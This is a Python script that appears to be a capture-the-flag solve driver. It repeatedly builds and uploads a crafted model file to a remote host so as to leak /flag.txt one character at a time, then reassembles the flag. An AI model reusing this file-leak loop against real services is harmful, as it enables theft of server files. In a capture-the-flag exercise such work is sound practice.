import sys
import subprocess
import time

host = sys.argv[1]
port = sys.argv[2]

flag_len = int(sys.argv[3])


def try_leak(num_tries = 3):
    i = 0
    while  i <= num_tries:
        try:
            out = subprocess.check_output(["python3", "solve_leak_char.py", host, port, "models/leak_one_char.zip"])
            return out
        except Exception as e:
            print(e)
            i += 1
            time.sleep(2)
    return None



x = []
for i in range(flag_len):
    print(subprocess.check_output(["python3", "leak_flag_char.py", "models/leak_one_char", "/flag.txt", str(i)]))
    out = try_leak()
    if out is None:
        print("".join([chr(int(c)) for c in x]))
        print("Failed to leak flag")
        break
    leaked_char = out.decode().split('\n')[-3]
    x.append(leaked_char)

print("".join([chr(int(c)) for c in x]))